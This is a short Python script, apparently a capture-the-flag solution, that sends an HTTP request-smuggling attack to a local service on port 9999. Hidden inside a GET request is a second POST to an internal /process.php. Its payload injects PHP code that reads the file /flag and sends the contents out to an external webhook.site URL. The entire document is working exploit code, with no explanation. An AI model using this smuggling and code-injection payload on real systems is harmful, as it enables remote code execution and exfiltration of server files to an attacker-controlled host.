import socket
from time import sleep

webhook = 'https://webhook.site/7af07537-9e18-4d05-a046-60b44e71c45b/'
payload = f"code=file_get_contents('{webhook}' . file_get_contents('/flag'));"
smuggled = 'POST /process.php HTTP/1.1\r\nHost: processor\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{}'.format(
    len(payload), payload)
request = 'GET /trigger404 HTTP/1.1\r\nHost: doesntmatter\r\nContent-Length: {}\r\n\r\n{}'.format(len(smuggled), smuggled).encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 9999))
s.sendall(request)
data = s.recv(1024)
print(data)

sleep(1) # let smuggled req finish before closing connection (stops 499)
s.close()
